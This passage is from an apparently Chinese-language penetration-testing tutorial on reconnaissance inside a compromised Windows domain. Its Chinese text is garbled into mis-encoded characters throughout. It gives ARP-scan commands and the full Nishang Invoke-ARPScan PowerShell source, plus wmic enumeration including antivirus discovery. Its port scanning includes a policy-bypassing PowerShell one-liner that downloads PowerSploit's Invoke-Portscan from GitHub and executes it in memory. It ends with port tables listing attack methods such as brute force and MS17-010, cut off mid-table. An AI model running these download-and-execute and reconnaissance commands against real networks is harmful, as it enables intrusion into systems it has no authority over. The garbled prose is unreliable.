<span class="number">1.</span>vps æ‰§è¡Œ</span><br></pre></td></tr></table></figure>

<h3 id="11-ARPæ‰«ææ¢æµ‹å†…ç½‘"><a href="#11-ARPæ‰«ææ¢æµ‹å†…ç½‘" class="headerlink" title="11.ARPæ‰«ææ¢æµ‹å†…ç½‘"></a>11.ARPæ‰«ææ¢æµ‹å†…ç½‘</h3><h4 id="01-arp-scanæ‰«æå·¥å…·"><a href="#01-arp-scanæ‰«æå·¥å…·" class="headerlink" title="01.arp-scanæ‰«æå·¥å…·"></a>01.arp-scanæ‰«æå·¥å…·</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan.exe -t 10.10.10.0/24</span><br></pre></td></tr></table></figure>

<h4 id="02-Empireä¸­çš„arpscanæ¨¡å—"><a href="#02-Empireä¸­çš„arpscanæ¨¡å—" class="headerlink" title="02.Empireä¸­çš„arpscanæ¨¡å—"></a>02.Empireä¸­çš„arpscanæ¨¡å—</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">usemodule powershell/situational_awareness/network/arpscan</span><br></pre></td></tr></table></figure>

<h4 id="03-Nishangä¸­çš„Invoke-ARPScan-ps1"><a href="#03-Nishangä¸­çš„Invoke-ARPScan-ps1" class="headerlink" title="03.Nishangä¸­çš„Invoke-ARPScan.ps1"></a>03.Nishangä¸­çš„Invoke-ARPScan.ps1</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass -Command &quot;&amp; &#123;Import-Module C:\Users\Administrator\Desktop\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 10.10.10.0/24&#125;&quot; &gt;&gt; C:\Users\Administrator\Desktop\Result.txt</span><br></pre></td></tr></table></figure>

<p><code>Invoke-ARPScan.ps1å¦‚ä¸‹</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Invoke-ARPScan</span></span> &#123;</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.Synopsis</span></span></span><br><span class="line"><span class="comment">   Performs an ARP scan against a given range of IPv4 IP Addresses.</span></span><br><span class="line"><span class="comment">   Part of Posh-SecMod (https://github.com/darkoperator/Posh-SecMod/)</span></span><br><span class="line"><span class="comment">   Author: darkoperator</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">   Performs an ARP scan against a given range of IPv4 IP Addresses.</span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">   Invoke an ARP Scan against a range of IPs specified in CIDR Format</span></span><br><span class="line"><span class="comment">    PS C:\&gt; Invoke-ARPScan -CIDR 172.20.10.1/24</span></span><br><span class="line"><span class="comment">    MAC                                                       Address                                                  </span></span><br><span class="line"><span class="comment">    ---                                                       -------                                                  </span></span><br><span class="line"><span class="comment">    14:10:9F:D5:1A:BF                                         172.20.10.2                                              </span></span><br><span class="line"><span class="comment">    00:0C:29:93:10:B5                                         172.20.10.3                                              </span></span><br><span class="line"><span class="comment">    00:0C:29:93:10:B5                                         172.20.10.15  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.LINK</span></span></span><br><span class="line"><span class="comment">https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line">    <span class="keyword">param</span> (</span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">ParameterSetName</span> = <span class="string">&quot;Range&quot;</span>,</span><br><span class="line">                   <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">        [<span class="built_in">string</span>]<span class="variable">$Range</span>,</span><br><span class="line"></span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">ParameterSetName</span> = <span class="string">&quot;CIDR&quot;</span>,</span><br><span class="line">                   <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">        [<span class="built_in">string</span>]<span class="variable">$CIDR</span>,</span><br><span class="line"></span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$false</span>,</span><br><span class="line">                   <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">        [<span class="built_in">string</span>]<span class="variable">$MaxThreads</span>=<span class="number">50</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Begin</span> </span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">New-IPv4Range</span></span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">            <span class="doctag">.Synopsis</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a Start and End IP.</span></span><br><span class="line"><span class="comment">            <span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a Start and End IP.</span></span><br><span class="line"><span class="comment">            #&gt;</span></span><br><span class="line">            <span class="keyword">param</span>(</span><br><span class="line">                [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">                           <span class="variable">$StartIP</span>,</span><br><span class="line">                           </span><br><span class="line">                [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">Position</span>=<span class="number">2</span>)]</span><br><span class="line">                           <span class="variable">$EndIP</span>          </span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># created by Dr. Tobias Weltner, MVP PowerShell</span></span><br><span class="line">            <span class="variable">$ip1</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$StartIP</span>).GetAddressBytes()</span><br><span class="line">            [<span class="built_in">Array</span>]::Reverse(<span class="variable">$ip1</span>)</span><br><span class="line">            <span class="variable">$ip1</span> = ([<span class="type">System.Net.IPAddress</span>](<span class="variable">$ip1</span> <span class="operator">-join</span> <span class="string">&#x27;.&#x27;</span>)).Address</span><br><span class="line"></span><br><span class="line">            <span class="variable">$ip2</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$EndIP</span>).GetAddressBytes()</span><br><span class="line">            [<span class="built_in">Array</span>]::Reverse(<span class="variable">$ip2</span>)</span><br><span class="line">            <span class="variable">$ip2</span> = ([<span class="type">System.Net.IPAddress</span>](<span class="variable">$ip2</span> <span class="operator">-join</span> <span class="string">&#x27;.&#x27;</span>)).Address</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$x</span>=<span class="variable">$ip1</span>; <span class="variable">$x</span> <span class="operator">-le</span> <span class="variable">$ip2</span>; <span class="variable">$x</span>++) &#123;</span><br><span class="line">                <span class="variable">$ip</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$x</span>).GetAddressBytes()</span><br><span class="line">                [<span class="built_in">Array</span>]::Reverse(<span class="variable">$ip</span>)</span><br><span class="line">                <span class="variable">$ip</span> <span class="operator">-join</span> <span class="string">&#x27;.&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">New-IPv4RangeFromCIDR</span> </span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">            <span class="doctag">.Synopsis</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a CIDR.</span></span><br><span class="line"><span class="comment">            <span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a CIDR.</span></span><br><span class="line"><span class="comment">            #&gt;</span></span><br><span class="line">            <span class="keyword">param</span>(</span><br><span class="line">                [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">                           <span class="variable">$Network</span></span><br><span class="line">            )</span><br><span class="line">            <span class="comment"># Extract the portions of the CIDR that will be needed</span></span><br><span class="line">            <span class="variable">$StrNetworkAddress</span> = (<span class="variable">$Network</span>.split(<span class="string">&quot;/&quot;</span>))[<span class="number">0</span>]</span><br><span class="line">            [<span class="built_in">int</span>]<span class="variable">$NetworkLength</span> = (<span class="variable">$Network</span>.split(<span class="string">&quot;/&quot;</span>))[<span class="number">1</span>]</span><br><span class="line">            <span class="variable">$NetworkIP</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$StrNetworkAddress</span>).GetAddressBytes()</span><br><span class="line">            <span class="variable">$IPLength</span> = <span class="number">32</span>-<span class="variable">$NetworkLength</span></span><br><span class="line">            [<span class="built_in">Array</span>]::Reverse(<span class="variable">$NetworkIP</span>)</span><br><span class="line">            <span class="variable">$NumberOfIPs</span> = ([<span class="type">System.Math</span>]::Pow(<span class="number">2</span>, <span class="variable">$IPLength</span>)) <span class="literal">-1</span></span><br><span class="line">            <span class="variable">$NetworkIP</span> = ([<span class="type">System.Net.IPAddress</span>](<span class="variable">$NetworkIP</span> <span class="operator">-join</span> <span class="string">&quot;.&quot;</span>)).Address</span><br><span class="line">            <span class="variable">$StartIP</span> = <span class="variable">$NetworkIP</span> +<span class="number">1</span></span><br><span class="line">            <span class="variable">$EndIP</span> = <span class="variable">$NetworkIP</span> + <span class="variable">$NumberOfIPs</span></span><br><span class="line">            <span class="comment"># We make sure they are of type Double before conversion</span></span><br><span class="line">            <span class="keyword">If</span> (<span class="variable">$EndIP</span> <span class="operator">-isnot</span> [<span class="built_in">double</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$EndIP</span> = <span class="variable">$EndIP</span> <span class="operator">-as</span> [<span class="built_in">double</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">If</span> (<span class="variable">$StartIP</span> <span class="operator">-isnot</span> [<span class="built_in">double</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$StartIP</span> = <span class="variable">$StartIP</span> <span class="operator">-as</span> [<span class="built_in">double</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># We turn the start IP and end IP in to strings so they can be used.</span></span><br><span class="line">            <span class="variable">$StartIP</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$StartIP</span>).IPAddressToString</span><br><span class="line">            <span class="variable">$EndIP</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$EndIP</span>).IPAddressToString</span><br><span class="line">            <span class="built_in">New-IPv4Range</span> <span class="variable">$StartIP</span> <span class="variable">$EndIP</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sign</span> = <span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Collections.Generic;</span></span><br><span class="line"><span class="string">using System.Text;</span></span><br><span class="line"><span class="string">using System.Net;</span></span><br><span class="line"><span class="string">using System.Net.NetworkInformation;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public static class NetUtils</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    [System.Runtime.InteropServices.DllImport(&quot;iphlpapi.dll&quot;, ExactSpelling = true)]</span></span><br><span class="line"><span class="string">    static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);</span></span><br><span class="line"><span class="string">    public static string GetMacAddress(String addr)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        try</span></span><br><span class="line"><span class="string">                &#123;                   </span></span><br><span class="line"><span class="string">                    IPAddress IPaddr = IPAddress.Parse(addr);</span></span><br><span class="line"><span class="string">                   </span></span><br><span class="line"><span class="string">                    byte[] mac = new byte[6];</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    int L = 6;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    SendARP(BitConverter.ToInt32(IPaddr.GetAddressBytes(), 0), 0, mac, ref L);</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    String macAddr = BitConverter.ToString(mac, 0, L);</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    return (macAddr.Replace(&#x27;-&#x27;,&#x27;:&#x27;));</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                catch (Exception ex)</span></span><br><span class="line"><span class="string">                &#123;</span></span><br><span class="line"><span class="string">                    return (ex.Message);              </span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Write-Verbose</span> <span class="string">&quot;Instanciating NetUtils&quot;</span></span><br><span class="line">            <span class="variable">$IPHlp</span> = <span class="built_in">Add-Type</span> <span class="literal">-TypeDefinition</span> <span class="variable">$sign</span> <span class="literal">-Language</span> CSharp <span class="literal">-PassThru</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Write-Verbose</span> <span class="string">&quot;NetUtils already instanciated&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Manage if range is given</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$Range</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$rangeips</span> = <span class="variable">$Range</span>.Split(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">            <span class="variable">$targets</span> = <span class="built_in">New-IPv4Range</span> <span class="literal">-StartIP</span> <span class="variable">$rangeips</span>[<span class="number">0</span>] <span class="literal">-EndIP</span> <span class="variable">$rangeips</span>[<span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Manage if CIDR is given</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$CIDR</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$targets</span> = <span class="built_in">New-IPv4RangeFromCIDR</span> <span class="literal">-Network</span> <span class="variable">$CIDR</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">Process</span> </span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="variable">$scancode</span> = &#123;</span><br><span class="line">            <span class="keyword">param</span>(<span class="variable">$IPAddress</span>,<span class="variable">$IPHlp</span>)</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$IPHlp::GetMacAddress</span>(<span class="variable">$IPAddress</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;<span class="built_in">New-Object</span> psobject <span class="literal">-Property</span> <span class="selector-tag">@</span>&#123;Address = <span class="variable">$IPAddress</span>; MAC = <span class="variable">$result</span>&#125;&#125;</span><br><span class="line">        &#125; <span class="comment"># end ScanCode var</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$jobs</span> = <span class="selector-tag">@</span>()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">        <span class="variable">$start</span> = <span class="built_in">get-date</span></span><br><span class="line">        <span class="built_in">write-verbose</span> <span class="string">&quot;Begin Scanning at <span class="variable">$start</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#Multithreading setup</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a pool of maxThread runspaces   </span></span><br><span class="line">        <span class="variable">$pool</span> = [<span class="type">runspacefactory</span>]::CreateRunspacePool(<span class="number">1</span>, <span class="variable">$MaxThreads</span>)   </span><br><span class="line">        <span class="variable">$pool</span>.Open()</span><br><span class="line">  </span><br><span class="line">        <span class="variable">$jobs</span> = <span class="selector-tag">@</span>()   </span><br><span class="line">        <span class="variable">$ps</span> = <span class="selector-tag">@</span>()   </span><br><span class="line">        <span class="variable">$wait</span> = <span class="selector-tag">@</span>()</span><br><span class="line"></span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># How many servers</span></span><br><span class="line">        <span class="variable">$record_count</span> = <span class="variable">$targets</span>.Length</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Loop through the endpoints starting a background job for each endpoint</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$IPAddress</span> <span class="keyword">in</span> <span class="variable">$targets</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment"># Show Progress</span></span><br><span class="line">            <span class="variable">$record_progress</span> = [<span class="built_in">int</span>][<span class="type">Math</span>]::Ceiling(((<span class="variable">$i</span> / <span class="variable">$record_count</span>) * <span class="number">100</span>))</span><br><span class="line">            <span class="comment"># Write-Progress -Activity &quot;Performing ARP Scan&quot; -PercentComplete $record_progress -Status &quot;Addresses Queried - $record_progress%&quot; -Id 1;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$</span>(<span class="variable">$pool</span>.GetAvailableRunspaces()) <span class="operator">-le</span> <span class="number">0</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">Start-Sleep</span> <span class="literal">-milliseconds</span> <span class="number">500</span></span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="comment"># create a &quot;powershell pipeline runner&quot;</span></span><br><span class="line">            <span class="variable">$ps</span> += [<span class="type">powershell</span>]::create()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># assign our pool of 3 runspaces to use   </span></span><br><span class="line">            <span class="variable">$ps</span>[<span class="variable">$i</span>].runspacepool = <span class="variable">$pool</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># command to run</span></span><br><span class="line">            [<span class="built_in">void</span>]<span class="variable">$ps</span>[<span class="variable">$i</span>].AddScript(<span class="variable">$scancode</span>).AddParameter(<span class="string">&#x27;IPaddress&#x27;</span>, <span class="variable">$IPAddress</span>).AddParameter(<span class="string">&#x27;IPHlp&#x27;</span>, <span class="variable">$IPHlp</span>)</span><br><span class="line">            <span class="comment">#[void]$ps[$i].AddParameter()</span></span><br><span class="line">    </span><br><span class="line">            <span class="comment"># start job</span></span><br><span class="line">            <span class="variable">$jobs</span> += <span class="variable">$ps</span>[<span class="variable">$i</span>].BeginInvoke();</span><br><span class="line">     </span><br><span class="line">            <span class="comment"># store wait handles for WaitForAll call   </span></span><br><span class="line">            <span class="variable">$wait</span> += <span class="variable">$jobs</span>[<span class="variable">$i</span>].AsyncWaitHandle</span><br><span class="line">    </span><br><span class="line">            <span class="variable">$i</span>++</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">write-verbose</span> <span class="string">&quot;Waiting for scanning threads to finish...&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$waitTimeout</span> = <span class="built_in">get-date</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$</span>(<span class="variable">$jobs</span> | ? &#123;<span class="variable">$_</span>.IsCompleted <span class="operator">-eq</span> <span class="variable">$false</span>&#125;).count <span class="operator">-gt</span> <span class="number">0</span> <span class="operator">-or</span> <span class="variable">$</span>(<span class="variable">$</span>(<span class="variable">$</span>(<span class="built_in">get-date</span>) - <span class="variable">$waitTimeout</span>).totalSeconds) <span class="operator">-gt</span> <span class="number">60</span>) </span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">Start-Sleep</span> <span class="literal">-milliseconds</span> <span class="number">500</span></span><br><span class="line">        &#125; </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># end async call   </span></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> <span class="operator">-lt</span> <span class="variable">$i</span>; <span class="variable">$y</span>++) &#123;     </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> </span><br><span class="line">            &#123;   </span><br><span class="line">                <span class="comment"># complete async job   </span></span><br><span class="line">                <span class="variable">$ScanResults</span> += <span class="variable">$ps</span>[<span class="variable">$y</span>].EndInvoke(<span class="variable">$jobs</span>[<span class="variable">$y</span>])   </span><br><span class="line">  </span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">catch</span> </span><br><span class="line">            &#123;   </span><br><span class="line">       </span><br><span class="line">                <span class="built_in">write-warning</span> <span class="string">&quot;error: <span class="variable">$_</span>&quot;</span>  </span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">finally</span> </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$ps</span>[<span class="variable">$y</span>].Dispose()</span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$pool</span>.Dispose()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ScanResults</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x03-wmicçš„ç®€å•ä½¿ç”¨"><a href="#0x03-wmicçš„ç®€å•ä½¿ç”¨" class="headerlink" title="0x03.wmicçš„ç®€å•ä½¿ç”¨"></a>0x03.wmicçš„ç®€å•ä½¿ç”¨</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wmic /?        #å…¨å±€å‚æ•°(å¸®åŠ©)</span><br><span class="line">wmic process /?        #è¿›ç¨‹å‚æ•°(å¸®åŠ©)</span><br><span class="line">wmic process get /?        #å±æ€§è·å–æ“ä½œå¸®åŠ©</span><br><span class="line">wmic process get caption,executablepath,processid    #è·å–å½“å‰è¿è¡Œè¿›ç¨‹ã€è¿›ç¨‹è·¯å¾„ã€è¿›ç¨‹id</span><br><span class="line">wmic service where (state=&quot;running&quot;) get name,processid,pathname,startmode,caption</span><br><span class="line">wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayname,productstate,pathtosignedproductexe</span><br><span class="line">wmic onboarddevice get description,devicetype,enable,status /format:list</span><br><span class="line">wmic product get name    #ç³»ç»Ÿè½¯ä»¶å®‰è£…æƒ…å†µ</span><br><span class="line">wmic environment get description,variablevalue    #æŸ¥çœ‹ç³»ç»Ÿç¯å¢ƒå˜é‡</span><br><span class="line">wmic computersystem get name,domain,manufacturer,model,username,roles/format:list</span><br><span class="line">wmic sysdriver get caption,name,pathname,servicetype,state,status /format:list</span><br></pre></td></tr></table></figure>

<h2 id="0x04-åŸŸå†…ç«¯å£æ¢æµ‹"><a href="#0x04-åŸŸå†…ç«¯å£æ¢æµ‹" class="headerlink" title="0x04.åŸŸå†…ç«¯å£æ¢æµ‹"></a>0x04.åŸŸå†…ç«¯å£æ¢æµ‹</h2><h3 id="01-scanlineTCP-UDPç«¯å£æ¢æµ‹"><a href="#01-scanlineTCP-UDPç«¯å£æ¢æµ‹" class="headerlink" title="01.scanlineTCP/UDPç«¯å£æ¢æµ‹"></a>01.scanlineTCP/UDPç«¯å£æ¢æµ‹</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scanline.exe -h -t 22,80-89,110,389,1099,1433,2059,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O C:\Users\Administrator\Desktop\log.txt -p 10.10.10.1-254</span><br></pre></td></tr></table></figure>

<h3 id="02-telnetæ‰«æ"><a href="#02-telnetæ‰«æ" class="headerlink" title="02.telnetæ‰«æ"></a>02.telnetæ‰«æ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">telnet 10.10.10.10 22</span><br></pre></td></tr></table></figure>

<h3 id="03-metasploitç«¯å£æ‰«æ"><a href="#03-metasploitç«¯å£æ‰«æ" class="headerlink" title="03.metasploitç«¯å£æ‰«æ"></a>03.metasploitç«¯å£æ‰«æ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set rhosts 192.168.1.1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="04-PowerSploitçš„Invoke-Portscan-ps1"><a href="#04-PowerSploitçš„Invoke-Portscan-ps1" class="headerlink" title="04.PowerSploitçš„Invoke-Portscan.ps1"></a>04.PowerSploitçš„Invoke-Portscan.ps1</h3><p><code>æ— æ–‡ä»¶æ‰«æ</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 10.10.10.0/24 -T 4 -ports &#x27;445,1433,8080,3389,80&#x27; -oA c:\user\administrator\desktop\res.txt&quot;</span><br></pre></td></tr></table></figure>

<h2 id="0x05-åŸŸå†…å¸¸è§ç«¯å£"><a href="#0x05-åŸŸå†…å¸¸è§ç«¯å£" class="headerlink" title="0x05.åŸŸå†…å¸¸è§ç«¯å£"></a>0x05.åŸŸå†…å¸¸è§ç«¯å£</h2><h3 id="01-æ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£"><a href="#01-æ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£" class="headerlink" title="01.æ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£"></a>01.æ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£</h3><table>
<thead>
<tr>
<th>ç«¯å£å·</th>
<th>ç«¯å£è¯´æ˜</th>
<th>ä½¿ç”¨è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>21ã€22ã€69</td>
<td>FTP/TFTPæ–‡ä»¶ä¼ è¾“åè®®</td>
<td>å…è®¸åŒ¿åçš„ä¸Šä¼ ã€ä¸‹è½½çˆ†ç ´å’Œå—…æ¢æ“ä½œ</td>
</tr>
<tr>
<td>2049</td>
<td>NFSæœåŠ¡</td>
<td>é…ç½®ä¸å½“</td>
</tr>
<tr>
<td>137ã€138ã€139</td>
<td>Netbiso/SAMBAæœåŠ¡</td>
<td>çˆ†ç ´ã€æœªæˆæƒè®¿é—®ã€è¿œç¨‹ä»£ç æ‰§è¡Œ</td>
</tr>
<tr>
<td>389</td>
<td>LDAPç›®å½•è®¿é—®åè®®</td>
<td>æ³¨å…¥ã€å…è®¸åŒ¿åè®¿é—®ã€å¼±å£ä»¤</td>
</tr>
<tr>
<td>135</td>
<td>DCOM/RPCæœåŠ¡</td>
<td>RPCé€šä¿¡æ¡¥æ¢</td>
</tr>
<tr>
<td>445</td>
<td>SMB</td>
<td>å…±äº«æ–‡ä»¶å¤¹(MS17-010),IPC$æœåŠ¡</td>
</tr>
</tbody></table>
<h3 id="02-è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£"><a href="#02-è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£" class="headerlink" title="02.è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£"></a>02.è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£</h3><table>
<thead>
<tr>
<th align="left">ç«¯å£å·</th>
<th>ç«¯å£è¯´æ˜</th>
<th>ä½¿ç”¨è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left">22</td>
<td>SSHè¿œç¨‹è¿æ¥</td>
<td>çˆ†ç ´ã€SSHéš§é“åŠå†…ç½‘ä»£ç†è½¬å‘ã€æ–‡ä»¶ä¼ è¾“</td>
</tr>
<tr>
<td align="left">23</td>
<td>Telnetè¿œç¨‹è¿æ¥</td>
<td>çˆ†ç ´ã€å—…æ¢ã€å¼±å£ä»¤</td>
</tr>
<tr>
<td align="left">3389</td>
<td>RDPè¿œç¨‹æ¡Œé¢è¿æ¥</td>
<td>Shiftåé—¨ï¼ˆWindows Server 2003ä»¥ä¸‹ç‰ˆæœ¬ï¼‰ã€çˆ†ç ´</td>
</tr>
<tr>
<td align="left">5900</td>
<td>VNC</td>
<td>å¼±å£ä»¤çˆ†ç ´</td>
</tr>
<tr>
<td align="left">5632</td>
<td>PcAnywhereæœåŠ¡</td>
<td>æŠ“å–å¯†ç ã€ä»£ç æ‰§è¡Œ</td>
</tr>
</tbody></table>
<h3 id="03-Webåº”ç”¨æœåŠ¡ç«¯å£"><a href="#03-Webåº”ç”¨æœåŠ¡ç«¯å£" class="headerlink" title="03.Webåº”ç”¨æœåŠ¡ç«¯å£"></a>03.Webåº”ç”¨æœåŠ¡ç«¯å£</h3><table>
<thead>
<tr>
<th align="left">ç«¯å£å·</th>
<th>ç«¯å£è¯´æ˜</th>
<th>ä½¿ç”¨è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
